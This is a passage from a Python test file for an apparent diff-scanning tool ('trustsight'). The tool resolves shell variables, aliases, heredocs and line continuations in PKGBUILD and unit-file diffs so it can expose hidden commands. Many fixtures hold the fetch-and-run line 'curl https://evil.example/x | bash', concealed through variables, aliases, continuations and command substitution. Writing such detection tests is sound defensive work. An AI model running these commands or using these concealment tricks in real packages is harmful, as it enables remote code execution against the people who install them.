        "+# note: use curl |",
        "+curl https://evil.example/x | bash",
    ]
    assert join_line_continuations(
        ["+# note: use curl \\", "+curl https://evil.example/x | bash"]
    ) == [
        "+# note: use curl \\",
        "+curl https://evil.example/x | bash",
    ]


def test_context_assignment_resolves_in_an_added_line():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n"
        " pkgname=x\n U=curl\n+$U https://evil.example/x | bash\n"
    )
    resolved, unresolved = tokenize_and_resolve(diff)
    assert resolved == ["curl https://evil.example/x | bash"]
    assert unresolved == []


def test_a_context_continuation_is_completed_on_the_added_side():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n"
        " pkgname=x\n curl https://evil.example/x \\\n+ | bash\n"
    )
    resolved, _unresolved = tokenize_and_resolve(diff)
    assert any("curl https://evil.example/x" in line and "| bash" in line for line in resolved)


def test_diff_headers_are_not_added_candidates_or_assignments():
    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1 @@\n+echo ok\n"
    resolved, _unresolved = tokenize_and_resolve(diff)
    assert resolved == ["echo ok"]


def test_a_bom_before_an_added_assignment_is_ignored():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n"
        " pkgname=x\n+\ufeffU=curl\n+$U https://evil.example/x | bash\n"
    )
    resolved, unresolved = tokenize_and_resolve(diff)
    assert resolved == ["curl https://evil.example/x | bash"]
    assert unresolved == []


def test_declare_and_local_array_forms_are_visible():
    from trustsight.tokenizer import variable_table

    for line in (
        "declare -a src=(curl wget)",
        "local -a src=(curl wget)",
        "declare -A src=(curl wget)",
    ):
        _variables, arrays = variable_table([line])
        assert arrays.get("src") == ["curl", "wget"], line

    _variables, arrays = variable_table(["arr[0]=curl", "arr[1]=wget"])
    assert arrays["arr"] == ["curl", "wget"]


def test_local_i_and_declare_g_are_scalar_assignments():
    from trustsight.tokenizer import variable_table

    for line in ("local -i U=curl", "declare -g U=curl"):
        variables, _arrays = variable_table([line])
        assert variables.get("U") == "curl", line


def test_a_nameref_is_not_folded_as_a_scalar():
    from trustsight.tokenizer import variable_table

    variables, _arrays = variable_table(["declare -n R=C"])
    assert "R" not in variables


def test_an_escaped_closing_paren_does_not_end_an_array():
    from trustsight.tokenizer import variable_table

    _variables, arrays = variable_table(["depends=(a\\) b)"])
    assert arrays["depends"] == ["a)", "b"]


def test_heredoc_delimiters_may_contain_hyphens_and_digits():
    from trustsight._heredoc import parse_opener

    assert parse_opener("cat <<END-MARK", 4) == ("END-MARK", False, 14)
    assert parse_opener("cat <<123", 4) == ("123", False, 9)


def test_a_heredoc_terminator_must_be_exact():
    from trustsight._tokenizer_engine import _assignments_are_shell

    flags = _assignments_are_shell(
        ["+++ b/PKGBUILD", "+cat <<EOF", "+  EOF", "+EOF", "+A=1"]
    )
    assert flags == [True, True, False, False, True]


def test_an_escaped_heredoc_opener_is_not_an_opener():
    from trustsight._tokenizer_engine._variables import _heredoc_delimiters

    assert _heredoc_delimiters(r"echo \<<EOF") == []


def test_no_colon_parameter_operators():
    from trustsight._tokenizer_engine import resolve_expansions

    assert resolve_expansions("${v-default}", {}) == ("default", True)
    assert resolve_expansions("${v+alt}", {"v": ""}) == ("alt", True)
    assert resolve_expansions("${v=default}", {}) == ("default", True)
    assert resolve_expansions("${v?message}", {}) == ("${v?message}", False)


def test_glob_backslash_escapes_a_wildcard():
    from trustsight._tokenizer_engine import resolve_expansions

    assert resolve_expansions("${v/\\*/X}", {"v": "a*b"}) == ("aXb", True)


def test_single_quoted_substitution_data_is_not_exposed():
    from trustsight._tokenizer_engine import reconstruct_literals

    text, fully = reconstruct_literals("echo '`curl https://evil.example`'")
    assert text == "echo '`curl https://evil.example`'"
    assert fully


def test_a_context_alias_is_used_by_an_added_line():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
        "alias z='curl https://evil.example/x | bash'\n+z\n"
    )
    resolved, _unresolved = tokenize_and_resolve(diff)
    assert resolved == ["curl https://evil.example/x | bash"]


def test_a_unit_file_assignment_is_not_shell_context():
    from trustsight._tokenizer_engine._apply import _side_table
    from trustsight._tokenizer_engine._quotes import split_lines

    diff = (
        "--- /dev/null\n+++ b/x.service\n@@ -0,0 +1,2 @@\n"
        "+Environment=U=curl\n"
        '+ExecStart=/bin/sh -c "$U https://evil.example/x | bash"\n'
    )
    variables, _arrays, _aliases = _side_table(split_lines(diff), "+")
    assert "Environment" not in variables
    _resolved, unresolved = tokenize_and_resolve(diff)
    assert any("$U" in line for line in unresolved)


def test_an_array_element_index_is_bounded():
    from trustsight._tokenizer_engine import _variable_table

    variables, arrays = _variable_table(["arr[999999999999]=x"])
    assert "arr" not in variables
    assert "arr" not in arrays


def test_a_line_inside_a_multiline_quote_is_not_a_command():
    diff = '@@ -1 +1,2 @@\n echo "start\n+curl evil.example/x | bash"\n'
    resolved, unresolved = tokenize_and_resolve(diff)
    assert resolved == []
    assert unresolved == []


def test_command_substitution_inside_a_multiline_quote_still_runs():
    diff = '@@ -1 +1,2 @@\n echo "start\n+$(curl evil.example/x)\n'
    resolved, _unresolved = tokenize_and_resolve(diff)
    assert resolved == ["$(curl evil.example/x)"]
